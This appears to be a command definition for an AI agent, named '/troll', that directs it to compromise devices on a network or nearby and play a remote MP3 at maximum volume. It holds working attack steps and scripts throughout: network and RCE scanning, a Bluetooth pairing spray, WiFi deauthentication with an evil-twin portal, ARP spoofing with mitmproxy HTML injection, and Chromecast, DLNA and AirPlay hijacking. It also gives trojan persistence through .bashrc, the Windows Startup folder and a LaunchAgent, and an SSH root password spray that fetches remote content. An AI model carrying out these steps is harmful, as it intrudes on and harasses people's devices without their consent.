---
name: troll
description: Compromise nearby/network devices and play music at max volume. Attack vectors include WiFi, Bluetooth, RCE exploitation, and trojan deployment. Usage /troll <target-or-network>
---

# Audio Trolling - Network & Proximity Device Compromise

**Target:** `$ARGUMENTS`

Compromise devices on the same network or nearby via wireless/Bluetooth, then play audio at maximum volume.

## Audio Payload

- **GCS URL:** `https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3`
- **Local backup:** `/Users/anhbinhnguyen/Downloads/domixi.mp3`

---

## Attack Vectors (Priority Order)

### Vector 1: Network RCE Exploitation

**Target: Devices on the same network with exploitable services**

```
1. Scan network for live hosts: nmap -sn <network>/24
2. Port scan all discovered hosts: rustscan -a <hosts> --ulimit 5000
3. Identify services with known RCE vulnerabilities
4. Exploit RCE to execute audio playback command
```

**Post-RCE Audio Playback Commands by OS:**

Linux:
```bash
# Download and play at max volume
curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o /tmp/.audio.mp3

# Set max volume
amixer set Master 100% 2>/dev/null || pactl set-sink-volume @DEFAULT_SINK@ 150% 2>/dev/null || wpctl set-volume @DEFAULT_AUDIO_SINK@ 1.5 2>/dev/null

# Play with various players (try all, at least one should work)
(mpv --no-video /tmp/.audio.mp3 || ffplay -nodisp -autoexit /tmp/.audio.mp3 || aplay /tmp/.audio.mp3 || cvlc --play-and-exit /tmp/.audio.mp3 || mplayer /tmp/.audio.mp3 || paplay /tmp/.audio.mp3) &
```

macOS:
```bash
curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o /tmp/.audio.mp3

# Max volume
osascript -e "set volume output volume 100"

# Play
afplay /tmp/.audio.mp3 &
```

Windows (PowerShell):
```powershell
# Download
Invoke-WebRequest -Uri "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -OutFile "$env:TEMP\audio.mp3"

# Max volume via nircmd or PowerShell
Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Audio { [DllImport("winmm.dll")] public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume); }'; [Audio]::waveOutSetVolume([IntPtr]::Zero, 0xFFFFFFFF)

# Play
Start-Process "wmplayer.exe" "$env:TEMP\audio.mp3"
```

Windows (cmd):
```cmd
curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o %TEMP%\audio.mp3
start wmplayer.exe %TEMP%\audio.mp3
```

---

### Vector 2: Bluetooth Audio Hijack

**Target: Nearby Bluetooth speakers, headphones, smart TVs, IoT devices**

```bash
# Step 1: Scan for Bluetooth devices
hcitool scan                          # Classic Bluetooth
bluetoothctl scan on                  # BLE + Classic
hcitool lescan                        # BLE only

# Step 2: Identify audio devices (look for A2DP profile)
sdptool browse <MAC_ADDRESS>          # Check for AudioSink service
bluetoothctl info <MAC_ADDRESS>       # Check device capabilities

# Step 3: Pair and connect (many speakers have no PIN or use 0000/1234)
bluetoothctl pair <MAC_ADDRESS>
bluetoothctl trust <MAC_ADDRESS>
bluetoothctl connect <MAC_ADDRESS>

# Step 4: Route audio to compromised device
pactl set-default-sink bluez_sink.<MAC_NO_COLONS>.a2dp_sink

# Step 5: Play at max volume
pactl set-sink-volume bluez_sink.<MAC_NO_COLONS>.a2dp_sink 150%
mpv --no-video /tmp/.audio.mp3
```

**BLE Exploitation (speakers with no auth):**
```bash
# Use gatttool to write to audio characteristic
# Many cheap BLE speakers accept unauthenticated connections
gatttool -b <MAC> --char-write-req --handle=<audio_handle> --value=<audio_data>
```

**Automated Bluetooth spray:**
```python
#!/usr/bin/env python3
"""Scan and attempt to pair+play on all nearby Bluetooth audio devices."""
import subprocess, time

def scan_bt_devices():
    result = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True, timeout=15)
    devices = []
    for line in result.stdout.strip().split('\n')[1:]:
        parts = line.strip().split('\t')
        if len(parts) >= 2:
            devices.append((parts[0], parts[1]))
    return devices

def try_pair_and_play(mac, name):
    print(f"[*] Attempting: {mac} ({name})")
    try:
        subprocess.run(['bluetoothctl', 'pair', mac], input='yes\n', capture_output=True, text=True, timeout=10)
        subprocess.run(['bluetoothctl', 'trust', mac], capture_output=True, text=True, timeout=5)
        subprocess.run(['bluetoothctl', 'connect', mac], capture_output=True, text=True, timeout=10)
        time.sleep(2)
        # Try to play
        subprocess.Popen(['mpv', '--no-video', '/tmp/.audio.mp3'])
        print(f"[+] SUCCESS: Playing on {name}")
    except Exception as e:
        print(f"[-] Failed: {e}")

devices = scan_bt_devices()
for mac, name in devices:
    try_pair_and_play(mac, name)
```

---

### Vector 3: WiFi Deauth + Evil Twin (Captive Portal with Audio)

**Target: WiFi-connected devices on the network**

```bash
# Step 1: Put interface in monitor mode
airmon-ng start wlan0

# Step 2: Capture nearby APs and clients
airodump-ng wlan0mon

# Step 3: Deauth target clients from their AP
aireplay-ng --deauth 100 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Step 4: Launch evil twin with captive portal that auto-plays audio
# Use hostapd-wpe or fluxion
# Serve a page with auto-playing audio:
```

**Captive portal HTML (auto-play audio):**
```html
<!DOCTYPE html>
<html>
<head><title>Network Login</title></head>
<body>
<h1>Please wait while we connect you...</h1>
<audio id="troll" autoplay loop>
  <source src="https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" type="audio/mpeg">
</audio>
<script>
  // Force play even with autoplay restrictions
  document.addEventListener('click', () => document.getElementById('troll').play());
  document.addEventListener('touchstart', () => document.getElementById('troll').play());
  // Set max volume via Web Audio API
  const ctx = new AudioContext();
  const source = ctx.createMediaElementSource(document.getElementById('troll'));
  const gain = ctx.createGain();
  gain.gain.value = 3.0; // 3x amplification
  source.connect(gain).connect(ctx.destination);
</script>
</body>
</html>
```

---

### Vector 4: ARP Spoofing + Traffic Injection

**Target: HTTP traffic on the network**

```bash
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: ARP spoof gateway
arpspoof -i eth0 -t <TARGET_IP> <GATEWAY_IP>

# Step 3: Inject audio into HTTP responses using mitmproxy
mitmproxy -s inject_audio.py
```

**mitmproxy inject script (inject_audio.py):**
```python
from mitmproxy import http

AUDIO_TAG = '<audio autoplay loop src="https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3"></audio>'

def response(flow: http.HTTPFlow):
    if flow.response and flow.response.headers.get("content-type", "").startswith("text/html"):
        content = flow.response.get_text()
        if "</body>" in content:
            flow.response.set_text(content.replace("</body>", f"{AUDIO_TAG}</body>"))
```

---

### Vector 5: Smart TV / Chromecast / DLNA / AirPlay

**Target: Media devices on the network**

```bash
# Discover DLNA/UPnP devices
gssdp-discover --timeout=5
nmap -sU -p 1900 --script=upnp-info <network>/24

# Discover Chromecast
avahi-browse -art | grep -i chromecast
nmap -p 8008,8443 <network>/24

# Discover AirPlay receivers
dns-sd -B _airplay._tcp
avahi-browse -art | grep -i airplay
```

**Chromecast hijack:**
```python
#!/usr/bin/env python3
"""Cast audio to all Chromecasts on the network."""
import pychromecast
import time

AUDIO_URL = "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3"

chromecasts, browser = pychromecast.get_chromecasts()
for cc in chromecasts:
    cc.wait()
    mc = cc.media_controller
    mc.play_media(AUDIO_URL, 'audio/mpeg')
    mc.block_until_active()
    cc.set_volume(1.0)  # Max volume
    print(f"[+] Playing on: {cc.name}")

browser.stop_discovery()
```

**DLNA/UPnP push:**
```bash
# Use pulseaudio-dlna or minidlna
pulseaudio-dlna  # Auto-discovers and streams to DLNA devices

# Or use curl with UPnP SOAP
curl -X POST "http://<DEVICE_IP>:PORT/AVTransport/control" \
  -H "Content-Type: text/xml" \
  -H "SOAPACTION: \"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI\"" \
  -d '<?xml version="1.0"?>
  <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
      <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
        <InstanceID>0</InstanceID>
        <CurrentURI>https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3</CurrentURI>
      </u:SetAVTransportURI>
    </s:Body>
  </s:Envelope>'
```

**AirPlay push:**
```bash
# Use shairplay or raop_play
# Many AirPlay receivers accept unauthenticated connections
shairplay -a <AIRPLAY_IP> /tmp/.audio.mp3
```

---

### Vector 6: Trojan / Payload Drop

**Target: Systems with file write access (SMB, FTP, NFS, web upload)**

```bash
# Step 1: Find writable shares
smbclient -L //<TARGET> -N
showmount -e <TARGET>
nmap --script=ftp-anon <TARGET>

# Step 2: Drop payload that plays audio on execution/login

# Linux startup persistence:
echo 'curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o /tmp/.a.mp3 && (amixer set Master 100% 2>/dev/null; mpv --no-video /tmp/.a.mp3 &) &' >> ~/.bashrc

# Windows startup:
# Drop in Startup folder: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
# troll.bat content:
curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o %TEMP%\a.mp3
start wmplayer.exe %TEMP%\a.mp3

# macOS LaunchAgent:
cat > ~/Library/LaunchAgents/com.troll.audio.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.troll.audio</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o /tmp/.a.mp3; osascript -e "set volume output volume 100"; afplay /tmp/.a.mp3</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
PLIST
```

---

### Vector 7: SSH/RCE Mass Spray

**Target: Hosts with weak SSH credentials or known RCE**

```bash
# Spray SSH with common creds and execute audio payload
for host in $(cat live_hosts.txt); do
    sshpass -p 'password' ssh -o StrictHostKeyChecking=no root@$host \
        'curl -sL "https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3" -o /tmp/.a.mp3; amixer set Master 100% 2>/dev/null; (mpv --no-video /tmp/.a.mp3 || ffplay -nodisp -autoexit /tmp/.a.mp3 || aplay /tmp/.a.mp3) &' 2>/dev/null &
done
```

---

## Execution Strategy

When `/troll <target>` is invoked:

### Phase 1: Discovery (30 seconds)
```
1. nmap -sn <target>/24          → find live hosts
2. nmap -sV -p- <live_hosts>     → find services
3. hcitool scan / bluetoothctl   → find BT devices
4. avahi-browse / gssdp-discover → find media devices
5. nmap -sU -p 1900,5353         → find UPnP/mDNS
```

### Phase 2: Classify Targets
```
- RCE-able services (Redis, MongoDB, exposed Docker, Jenkins, etc.)
- Bluetooth audio devices (speakers, headphones, TVs)
- Smart TVs / Chromecast / DLNA / AirPlay
- SSH with weak creds
- Writable network shares (SMB, NFS, FTP)
- HTTP traffic for injection
```

### Phase 3: Compromise & Play (parallel)
```
For each target class, run the appropriate vector in parallel:
- RCE targets → exploit + play command
- BT devices → pair + stream
- Smart devices → cast/push audio
- SSH targets → spray + play command
- Network shares → drop trojan
- HTTP → inject audio tag
```

### Phase 4: Verify & Amplify
```
1. Confirm audio playing on each compromised device
2. Set volume to maximum on all targets
3. Loop playback for persistence
4. Log all successful compromises
```

---

## Quick One-Liners

**Play on local network (macOS attacker):**
```bash
# Find and play on all Chromecasts
python3 -c "
import pychromecast
ccs, b = pychromecast.get_chromecasts()
for c in ccs:
    c.wait(); c.set_volume(1.0)
    c.media_controller.play_media('https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3','audio/mpeg')
b.stop_discovery()
"
```

**Play on compromised Linux host:**
```bash
curl -sL https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3 -o /tmp/.a.mp3 && amixer set Master 100% 2>/dev/null && (mpv --no-video /tmp/.a.mp3 &)
```

**Play on compromised macOS host:**
```bash
curl -sL https://storage.googleapis.com/omelet-f0b89.appspot.com/troll/domixi.mp3 -o /tmp/.a.mp3 && osascript -e "set volume output volume 100" && afplay /tmp/.a.mp3 &
```

---

## Constraints

- Authorized environments only
- Audio playback is non-destructive (annoyance, not damage)
- All compromises should be logged for reporting
- Clean up artifacts after engagement
